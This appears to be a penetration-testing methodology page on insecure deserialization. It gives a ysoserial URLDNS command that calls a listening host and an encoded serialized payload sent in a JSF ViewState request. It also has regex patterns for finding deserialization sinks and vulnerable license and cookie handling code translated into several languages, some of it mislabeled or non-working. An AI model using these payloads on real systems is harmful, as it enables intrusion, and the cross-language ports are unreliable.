# Insecure Deserialization

## Check List

## Methodology

### Black Box

#### Java Deserialization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Then view the requests sent and check if any data is sent as follows

```
"javax.faces.ViewState" value="rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAN0AAE0cHQAEy9wcm90ZWN0ZWQvaG9tZS5qc3A="
```
{% endstep %}

{% step %}
For the uninitiated, the prefix `rO0ABXV` indicates an unencrypted Java Object
{% endstep %}

{% step %}
Then, by creating a dangerous object using the yesoserail tool for the js language, I sent the request by sending a request similar to the one below, and if the code is executed, I say that a vulnerability has occurred

```bash
./java -jar ysoserial.jar URLDNS "<http://listening-host>" | base64
```

now send request

```http
GET /res/login.jsf?javax.faces.ViewState=%72%4f%30%41%42%58%4e%79%41%42%46%71%59%58%5a%68%4c%6e%56%30%61%57%77%75%53%47%46%7a%61%45%31%68%63%41%55%48%32%73%48%44%46%6d%44%52%41%77%41%43%52%67%41%4b%62%47%39%68%5a%45%5a%68%59%33%52%76%63%6b%6b%41%43%58%52%6f%63%6d%56%7a%61%47%39%73%5a%48%68%77%50%30%41%41%41%41%41%41%41%41%78%33%43%41%41%41%41%42%41%41%41%41%41%42%63%33%49%41%44%47%70%68%64%6d%45%75%62%6d%56%30%4c%6c%56%53%54%4a%59%6c%4e%7a%59%61%2f%4f%52%79%41%77%41%48%53%51%41%49%61%47%46%7a%61%45%4e%76%5a%47%56%4a%41%41%52%77%62%33%4a%30%54%41%41%4a%59%58%56%30%61%47%39%79%61%58%52%35%64%41%41%53%54%47%70%68%64%6d%45%76%62%47%46%75%5a%79%39%54%64%48%4a%70%62%6d%63%37%54%41%41%45%5a%6d%6c%73%5a%58%45%41%66%67%41%44%54%41%41%45%61%47%39%7a%64%48%45%41%66%67%41%44%54%41%41%49%63%48%4a%76%64%47%39%6a%62%32%78%78%41%48%34%41%41%30%77%41%41%33%4a%6c%5a%6e%45%41%66%67%41%44%65%48%44%2f%2f%2f%2f%2f%2f%2f%2f%2f%2f%33%51%41%4c%47%6b%7a%62%58%59%32%5a%44%42%76%4d%57%70%78%4d%7a%56%70%64%54%67%79%5a%6a%63%79%5a%57%35%7a%5a%54%4d%31%4f%58%64%34%62%6d%78%6a%4c%6d%39%68%63%33%52%70%5a%6e%6b%75%59%32%39%74%64%41%41%41%63%51%42%2b%41%41%56%30%41%41%52%6f%64%48%52%77%63%48%68%30%41%44%4e%6f%64%48%52%77%4f%69%38%76%61%54%4e%74%64%6a%5a%6b%4d%47%38%78%61%6e%45%7a%4e%57%6c%31%4f%44%4a%6d%4e%7a%4a%6c%62%6e%4e%6c%4d%7a%55%35%64%33%68%75%62%47%4d%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%31%34 HTTP/1.1
Host: localhost:9060
```

the Response

```http
HTTP/1.1 500 Internal Server Error
X-Powered-By: Servlet/3.1
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Content-Type: text/html;charset=ISO-8859-1
$WSEP: 
Content-Language: en-US
Connection: Close
Date: Mon, 19 Feb 2024 03:16:40 GMT
Content-Length: 103

Error 500: javax.servlet.ServletException: java.util.HashMap incompatible with [Ljava.lang.Object&#59;
```
{% endstep %}
{% endstepper %}

***

### White Box

#### Insecure Deserialization (Trusted & Untrusted Signed Object Confusion)

{% stepper %}
{% step %}
Map the entire target system using the Burp Suite tool
{% endstep %}

{% step %}
Map the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
Then review the endpoint process responsible for generating, processing, validating, or receiving **License / Activation / Trial** data in the code logic, and check whether it uses `getObject` and `deserialize`, like in the code below

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C# " %}
```regex
(?<Source>byte\[\]|Stream)|(?<Sink>BinaryFormatter|NetDataContractSerializer|Deserialize\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>byte\[\]\s+\w+)|(?<Sink>deserialize(UntrustedSignedObject)?\s*\(|SignedObject\s*\.\s*getObject\s*\(|getObject\s*\()
```
{% endtab %}

{% tab title="PHP " %}
```regex
(?<Source>\$_(GET|POST|REQUEST)|\$[a-zA-Z0-9_]+)|(?<Sink>unserialize\s*\(|__wakeup|__destruct)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(?<Source>Buffer|req\.body)|(?<Sink>JSON\.parse\s*\(|deserialize\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection (Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
(byte\[\]|Stream)|(BinaryFormatter|NetDataContractSerializer|Deserialize\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>byte\[\]\s+\w+)|(?<Sink>deserialize(UntrustedSignedObject)?\s*\(|SignedObject\s*\.\s*getObject\s*\(|getObject\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(\$_(GET|POST|REQUEST)|\$[a-zA-Z0-9_]+)|(unserialize\s*\(|__wakeup|__destruct)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(Buffer|req\.body)|(JSON\.parse\s*\(|deserialize\s*\()
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="C#" %}
```csharp
private static byte[] Verify(byte[] data, KeyConfig keyConfig)
{
    string algorithm = keyConfig.Version == "2" ? "SHA512withRSA" : "SHA1withDSA";

    using var publicKey = GetPublicKey(keyConfig);
    using var signature = System.Security.Cryptography.SignatureAlgorithm.Create(algorithm); // placeholder, باید mapping دقیق RSA/DSA داشته باشه

    var signedObject = (SignedObject)JavaSerializationUtilities.Deserialize(data, typeof(SignedObject), new Type[] { typeof(byte[]) }); // [1]

    if (keyConfig.IsServer)
    {
        var container = (SignedContainer)JavaSerializationUtilities.DeserializeUntrustedSignedObject(signedObject, typeof(SignedContainer), new Type[] { typeof(byte[]) });
        return container.Data;
    }
    else
    {
        bool verified = signedObject.Verify(publicKey, signature); // [2]
        if (!verified)
        {
            throw new IOException("Unable to verify signature!");
        }
        var signedContainer = (SignedContainer)signedObject.Object; // [3]
        return signedContainer.Data;
    }
}
```
{% endtab %}

{% tab title="JavaScript" %}
```java
public static Object verify(byte[] data, KeyConfig keyConfig) throws Exception {
    String algorithm = "2".equals(keyConfig.getVersion()) ? "RSA-SHA512" : "DSA-SHA1";

    PublicKey publicKey = getPublicKey(keyConfig);

    SignedObject signedObject =
            JavaSerializationUtilities.deserialize(data, SignedObject.class); // [1]

    if (keyConfig.isServer()) {
        SignedContainer container =
                JavaSerializationUtilities.deserializeUntrustedSignedObject(
                        signedObject, SignedContainer.class);
        return container.getData();
    } else {
        Signature verifier = Signature.getInstance(algorithm);
        boolean verified = signedObject.verify(publicKey, verifier); // [2]
        if (!verified) {
            throw new Exception("Unable to verify signature!");
        }
        SignedContainer signedContainer =
                (SignedContainer) signedObject.getObject(); // [3]
        return signedContainer.getData();
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function verify($data, $keyConfig) {
    $algorithm = ($keyConfig->getVersion() === "2") ? "SHA512" : "SHA1";

    $publicKey = getPublicKey($keyConfig);

    $signedObject = JavaSerializationUtilities::deserialize($data, SignedObject::class, [ 'byte[]' ]); // [1]

    if ($keyConfig->isServer()) {
        $container = JavaSerializationUtilities::deserializeUntrustedSignedObject($signedObject, SignedContainer::class, [ 'byte[]' ]);
        return $container->getData();
    } else {
        $verified = $signedObject->verify($publicKey, $algorithm); // [2]
        if (!$verified) {
            throw new \Exception("Unable to verify signature!");
        }
        $signedContainer = $signedObject->getObject(); // [3]
        return $signedContainer->getData();
    }
}
```
{% endtab %}

{% tab title="Node JS" %}
```js
async function verify(data, keyConfig) {
    const algorithm = keyConfig.version === "2" ? "RSA-SHA512" : "DSA-SHA1";

    const publicKey = getPublicKey(keyConfig);

    const signedObject = await JavaSerializationUtilities.deserialize(data, SignedObject); // [1]

    if (keyConfig.isServer) {
        const container = await JavaSerializationUtilities.deserializeUntrustedSignedObject(signedObject, SignedContainer);
        return container.getData();
    } else {
        const verifier = crypto.createVerify(algorithm);
        const verified = signedObject.verify(publicKey, verifier); // [2]
        if (!verified) {
            throw new Error("Unable to verify signature!");
        }
        const signedContainer = signedObject.getObject(); // [3]
        return signedContainer.getData();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Then send a license request with a malicious serialized payload and record the vulnerability
{% endstep %}
{% endstepper %}

***

#### Deserialize Cookie Data

{% stepper %}
{% step %}
Map the entire target system or product using the Burp Suite tool
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
In the system or product, look for the main entry point and the update management/distribution page that is responsible for receiving updates
{% endstep %}

{% step %}
On this page, look for endpoints that use SOAP
{% endstep %}

{% step %}
After mapping all endpoints, search for endpoint names such as `Token`, `Authorize`, `Authenticate`, or `GetCookie`
{% endstep %}

{% step %}
Then find and review the function in the code that processes the cookie endpoint, like in the code below

{% tabs %}
{% tab title="C#" %}
```csharp
public Cookie GetCookie(AuthorizationCookie[] authCookies, Cookie oldCookie, DateTime lastChange, DateTime currentTime, string protocolVersion)
{
    if (Client.clientImplementation == null)
    {
        Client.CreateClientImplementation();
    }

    string ipaddress = this.GetIPAddress();

    return Client.clientImplementation.GetCookie(
        authCookies,
        oldCookie,
        lastChange,
        currentTime,
        protocolVersion,
        ipaddress
    );
}
```
{% endtab %}

{% tab title="Java" %}
```java
public Cookie getCookie(AuthorizationCookie[] authCookies,
                        Cookie oldCookie,
                        Date lastChange,
                        Date currentTime,
                        String protocolVersion) {

    if (Client.clientImplementation == null) {
        Client.createClientImplementation();
    }

    String ipaddress = this.getIPAddress();

    return Client.clientImplementation.getCookie(
            authCookies,
            oldCookie,
            lastChange,
            currentTime,
            protocolVersion,
            ipaddress
    );
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function getCookie($authCookies, $oldCookie, $lastChange, $currentTime, $protocolVersion)
{
    if (Client::$clientImplementation === null) {
        Client::createClientImplementation();
    }

    $ipaddress = $this->getIPAddress();

    return Client::$clientImplementation->getCookie(
        $authCookies,
        $oldCookie,
        $lastChange,
        $currentTime,
        $protocolVersion,
        $ipaddress
    );
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function getCookie(authCookies, oldCookie, lastChange, currentTime, protocolVersion) {

    if (Client.clientImplementation == null) {
        Client.createClientImplementation();
    }

    const ipaddress = this.getIPAddress();

    return Client.clientImplementation.getCookie(
        authCookies,
        oldCookie,
        lastChange,
        currentTime,
        protocolVersion,
        ipaddress
    );
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
In the processing flow, the code execution goes to the `CrackAuthorizationCookie` method. Then the data is processed inside the `UnencryptedAuthorizationCookieData` and `CrackAuthorizationCookie` classes. In the `DecryptData` method, the main data processing happens, and based on a condition in the code, the data is passed to a `deserialize` function using `BinaryFormatter`

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(BinaryFormatter\s+\w+\s*=\s*new\s+BinaryFormatter\s*\(\))|(\.Deserialize\s*\()|(NetDataContractSerializer\s*\()|(LosFormatter\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regex
(ObjectInputStream\s*\()|(\.readObject\s*\()|(XMLDecoder\s*\()|(readUnshared\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(unserialize\s*\()|(yaml_parse\s*\()|(igbinary_unserialize\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(serialize\.(unserialize|deserialize)\s*\()|(JSON\.parse\s*\()|(v8\.deserialize\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
BinaryFormatter\s+\w+\s*=\s*new\s+BinaryFormatter\s*\(\)|\.Deserialize\s*\(|NetDataContractSerializer\s*\(|LosFormatter\s*\(
```
{% endtab %}

{% tab title="Java" %}
```regex
ObjectInputStream\s*\(|\.readObject\s*\(|XMLDecoder\s*\(|readUnshared\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regex
unserialize\s*\(|yaml_parse\s*\(|igbinary_unserialize\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regex
serialize\.(unserialize|deserialize)\s*\(|JSON\.parse\s*\(|v8\.deserialize\s*\(
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="C#" %}
```csharp
internal object DecryptData(byte[] cookieData)
{
    if (cookieData == null)
    {
        throw new LoggedArgumentNullException("cookieData");
    }

    ICryptoTransform cryptoTransform = this.cryptoServiceProvider.CreateDecryptor();
    byte[] array;

    try
    {
        if (cookieData.Length % cryptoTransform.InputBlockSize != 0 || cookieData.Length <= cryptoTransform.InputBlockSize)
        {
            throw new LoggedArgumentException(
                "Can't decrypt bogus cookieData; data is size, " + cookieData.Length + 
                ", which is not a multiple of " + cryptoTransform.InputBlockSize,
                "cookieData"
            );
        }

        array = new byte[cookieData.Length - cryptoTransform.InputBlockSize];
        cryptoTransform.TransformBlock(cookieData, 0, cryptoTransform.InputBlockSize, EncryptionHelper.scratchBuffer, 0);
        cryptoTransform.TransformBlock(cookieData, cryptoTransform.InputBlockSize, cookieData.Length - cryptoTransform.InputBlockSize, array, 0);
    }
    finally
    {
        cryptoTransform.Dispose();
    }

    object obj = null;

    if (this.classType == typeof(UnencryptedCookieData))
    {
        UnencryptedCookieData unencryptedCookieData = new UnencryptedCookieData();
        try
        {
            unencryptedCookieData.Deserialize(array);
        }
        catch (Exception ex)
        {
            if (ex is OutOfMemoryException) throw;
            throw new LoggedArgumentException(ex.ToString(), "cookieData");
        }
        obj = unencryptedCookieData;
    }
    else
    {
        BinaryFormatter binaryFormatter = new BinaryFormatter();
        MemoryStream memoryStream = new MemoryStream(array);
        try
        {
            obj = binaryFormatter.Deserialize(memoryStream);
        }
        catch (Exception ex2)
        {
            if (ex2 is OutOfMemoryException) throw;
            throw new LoggedArgumentException(ex2.ToString(), "cookieData");
        }

        if (obj.GetType() != this.classType)
        {
            throw new LoggedArgumentException(
                "Decrypted cookie has the wrong data type. Expected type = " + this.classType +
                ", actual type = " + obj.GetType(),
                "cookieData"
            );
        }
    }

    return obj;
}

```
{% endtab %}

{% tab title="Java" %}
```java
protected Object decryptData(byte[] cookieData) throws Exception {
    if (cookieData == null) {
        throw new LoggedArgumentNullException("cookieData");
    }

    Cipher cryptoTransform = this.cryptoServiceProvider.createDecryptor();
    byte[] array;

    try {
        int blockSize = cryptoTransform.getBlockSize();
        if (cookieData.length % blockSize != 0 || cookieData.length <= blockSize) {
            throw new LoggedArgumentException(
                "Can't decrypt bogus cookieData; data is size, " + cookieData.length +
                ", which is not a multiple of " + blockSize,
                "cookieData"
            );
        }

        array = new byte[cookieData.length - blockSize];
        cryptoTransform.update(cookieData, 0, blockSize, EncryptionHelper.scratchBuffer, 0);
        cryptoTransform.update(cookieData, blockSize, cookieData.length - blockSize, array, 0);
    } finally {
        cryptoTransform.doFinal();
    }

    Object obj = null;

    if (this.classType == UnencryptedCookieData.class) {
        UnencryptedCookieData unencryptedCookieData = new UnencryptedCookieData();
        try {
            unencryptedCookieData.deserialize(array);
        } catch (Exception ex) {
            throw new LoggedArgumentException(ex.toString(), "cookieData");
        }
        obj = unencryptedCookieData;
    } else {
        try (ByteArrayInputStream bis = new ByteArrayInputStream(array);
             ObjectInputStream ois = new ObjectInputStream(bis)) {

            obj = ois.readObject();
        } catch (Exception ex2) {
            throw new LoggedArgumentException(ex2.toString(), "cookieData");
        }

        if (!obj.getClass().equals(this.classType)) {
            throw new LoggedArgumentException(
                "Decrypted cookie has the wrong data type. Expected type = " + this.classType +
                ", actual type = " + obj.getClass(),
                "cookieData"
            );
        }
    }

    return obj;
}

```
{% endtab %}

{% tab title="PHP" %}
```php
protected function decryptData($cookieData)
{
    if ($cookieData === null) {
        throw new LoggedArgumentNullException("cookieData");
    }

    $cryptoTransform = $this->cryptoServiceProvider->createDecryptor();
    $array = null;

    try {
        $blockSize = $cryptoTransform->getBlockSize();
        if (strlen($cookieData) % $blockSize != 0 || strlen($cookieData) <= $blockSize) {
            throw new LoggedArgumentException(
                "Can't decrypt bogus cookieData; data is size, " . strlen($cookieData) .
                ", which is not a multiple of " . $blockSize,
                "cookieData"
            );
        }

        $array = substr($cookieData, $blockSize);
        $cryptoTransform->transformBlock(substr($cookieData, 0, $blockSize), EncryptionHelper::$scratchBuffer);
        $cryptoTransform->transformBlock($array, $array);
    } finally {
        $cryptoTransform->dispose();
    }

    $obj = null;

    if ($this->classType === UnencryptedCookieData::class) {
        $unencryptedCookieData = new UnencryptedCookieData();
        try {
            $unencryptedCookieData->deserialize($array);
        } catch (Exception $ex) {
            throw new LoggedArgumentException($ex->getMessage(), "cookieData");
        }
        $obj = $unencryptedCookieData;
    } else {
        try {
            $obj = unserialize($array);
        } catch (Exception $ex2) {
            throw new LoggedArgumentException($ex2->getMessage(), "cookieData");
        }

        if (get_class($obj) !== $this->classType) {
            throw new LoggedArgumentException(
                "Decrypted cookie has the wrong data type. Expected type = " . $this->classType .
                ", actual type = " . get_class($obj),
                "cookieData"
            );
        }
    }

    return $obj;
}

```
{% endtab %}

{% tab title="Node.js" %}
```js
function decryptData(cookieData) {
    if (!cookieData) {
        throw new LoggedArgumentNullException("cookieData");
    }

    const cryptoTransform = this.cryptoServiceProvider.createDecryptor();
    let array;

    try {
        const blockSize = cryptoTransform.getBlockSize();
        if (cookieData.length % blockSize !== 0 || cookieData.length <= blockSize) {
            throw new LoggedArgumentException(
                `Can't decrypt bogus cookieData; data is size, ${cookieData.length}, which is not a multiple of ${blockSize}`,
                "cookieData"
            );
        }

        array = cookieData.slice(blockSize);
        cryptoTransform.transformBlock(cookieData.slice(0, blockSize), EncryptionHelper.scratchBuffer);
        cryptoTransform.transformBlock(array, array);
    } finally {
        cryptoTransform.dispose();
    }

    let obj = null;

    if (this.classType === UnencryptedCookieData) {
        const unencryptedCookieData = new UnencryptedCookieData();
        try {
            unencryptedCookieData.deserialize(array);
        } catch (ex) {
            throw new LoggedArgumentException(ex.toString(), "cookieData");
        }
        obj = unencryptedCookieData;
    } else {
        try {
            obj = JSON.parse(array); // Node.js approximation for BinaryFormatter
        } catch (ex2) {
            throw new LoggedArgumentException(ex2.toString(), "cookieData");
        }

        if (obj.constructor !== this.classType) {
            throw new LoggedArgumentException(
                `Decrypted cookie has the wrong data type. Expected type = ${this.classType}, actual type = ${obj.constructor}`,
                "cookieData"
            );
        }
    }

    return obj;
}

```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
